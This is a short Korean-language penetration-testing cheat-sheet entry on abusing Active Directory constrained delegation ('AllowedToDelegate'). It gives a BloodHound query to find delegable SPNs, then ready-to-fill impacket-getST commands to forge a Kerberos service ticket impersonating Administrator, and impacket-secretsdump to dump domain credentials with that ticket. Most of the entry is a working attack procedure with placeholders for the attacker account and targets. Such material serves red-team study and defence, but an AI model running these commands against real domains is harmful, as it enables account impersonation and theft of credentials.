# AllowedToDelegate

특정 서비스에 대해 다른 유저를 사칭한 TGS를 발급할 수 있는 설정이다. BloodHound에서 노드를 클릭하면 `allowedtodelegate` 속성에 접근 가능한 SPN 목록이 표시된다.

```bash
# allowedtodelegate 속성에서 SPN 확인 (BloodHound 쿼리)
# MATCH (u)-[:AllowedToDelegate]->(c:Computer)
# RETURN u.name, u.allowedtodelegate, c.name

# Administrator 사칭 TGS 발급 (Kerberos 88)
impacket-getST \
  -spn '<allowedtodelegate에서 확인한 SPN>' \
  -impersonate Administrator \
  -dc-ip <DC_IP> \
  <도메인>/<공격자계정>:'<패스워드>'  # ← 수정

# TGS로 접근 (SMB 445)
export KRB5CCNAME=Administrator@<SPN>@<도메인>.ccache
impacket-secretsdump -k -no-pass <도메인>/Administrator@<대상FQDN>
```